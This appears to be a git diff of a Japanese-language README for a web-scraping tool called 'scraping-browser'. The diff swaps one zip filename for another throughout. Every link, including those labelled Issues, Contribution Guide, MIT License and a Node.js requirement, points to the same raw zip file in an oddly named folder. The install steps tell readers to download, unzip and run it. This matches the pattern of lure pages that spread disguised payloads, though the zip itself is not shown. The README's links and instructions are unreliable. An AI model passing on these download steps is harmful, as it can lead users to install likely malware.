@@ -1,6 +1,6 @@
 # 🌐 scraping-browser - Effortless Web Scraping Made Simple
 
-[![Download scraping-browser](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip)](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip)
+[![Download scraping-browser](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip)](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip)
 
 ## 📖 Overview
 Scraping Browser は、Puppeteer、Selenium、Playwright を使用した手間のかからない Webスクレイピングのための自動化ヘッドレスブラウザです。このツールを使用すると、面倒な Web データ収集が簡単になります。プログラミングの知識がなくても、誰でも使えるように設計されています。
@@ -10,15 +10,15 @@ Scraping Browser は、Puppeteer、Selenium、Playwright を使用した手間�
 
 ### 🖥️ System Requirements
 - オペレーティングシステム: Windows, macOS, または Linux
-- https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip (バージョン 12 以上)
+- https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip (バージョン 12 以上)
 - インターネット接続
 
 ## 🔗 Download & Install
 scraping-browser を入手するには、次の手順に従ってください。
 
-1. [ここをクリックして scraping-browser をダウンロード](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip)します。
+1. [ここをクリックして scraping-browser をダウンロード](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip)します。
 2. ダウンロードが完了したら、ファイルを解凍します。
-3. 解凍したフォルダー内の `https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip` をダブルクリックして、アプリケーションを開始します。
+3. 解凍したフォルダー内の `https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip` をダブルクリックして、アプリケーションを開始します。
 
 ## 📥 Usage
 scraping-browser を使用するのは簡単です。以下の手順に従ってください。
@@ -38,17 +38,17 @@ scraping-browser を使用するのは簡単です。以下の手順に従って
 
 - **アプリケーションが起動しない**: インターネット接続を確認し、必要な依存関係がインストールされているか確認してください。
 - **データ収集が正しく行われない**: 掲載されている URL や要素の選択が正しいか再確認してください。
-- **サポートが必要**: [GitHub のリポジトリで問題を報告](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip)してください。
+- **サポートが必要**: [GitHub のリポジトリで問題を報告](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip)してください。
 
 ## 👋 Contributing
-コミュニティの支援を大いに歓迎します。改善したい点や新機能の提案があれば、[こちらから貢献してください](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip)。
+コミュニティの支援を大いに歓迎します。改善したい点や新機能の提案があれば、[こちらから貢献してください](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip)。
 
 ## 📄 License
-このプロジェクトは [MIT License](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip) のもとに公開されています。商業利用や個人用が可能です。 
+このプロジェクトは [MIT License](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip) のもとに公開されています。商業利用や個人用が可能です。 
 
 ## 📌 Important Links
-- [Download scraping-browser](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip)
-- [Issues](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip)
-- [Contribution Guide](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping-browser-3.6-alpha.2.zip)
+- [Download scraping-browser](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip)
+- [Issues](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/amineeng/scraping-browser/main/tuggingly/scraping_browser_v2.0.zip)
 
 このリポジトリが web データ収集の新しい方法を提供し、多くの人々に役立つことを願っています。
